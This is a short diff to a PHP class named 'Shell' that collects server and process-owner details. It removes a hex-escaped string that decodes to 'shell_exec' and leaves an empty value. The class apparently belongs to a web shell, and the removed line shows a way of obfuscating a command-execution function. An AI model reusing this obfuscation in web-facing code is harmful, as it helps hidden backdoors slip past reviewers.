@@ -26,7 +26,7 @@ class Shell {
             'hostname' => $hostname,
             'server_addr' => $_SERVER['SERVER_ADDR'],
             'server_port' => $_SERVER['SERVER_PORT'],
-            'interpreter' => "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63",
+            'interpreter' => '',
             'request_time' => $_SERVER['REQUEST_TIME'],
             'php_owner_uid' => getmyuid(),
             'php_owner_gid' => getmygid(),
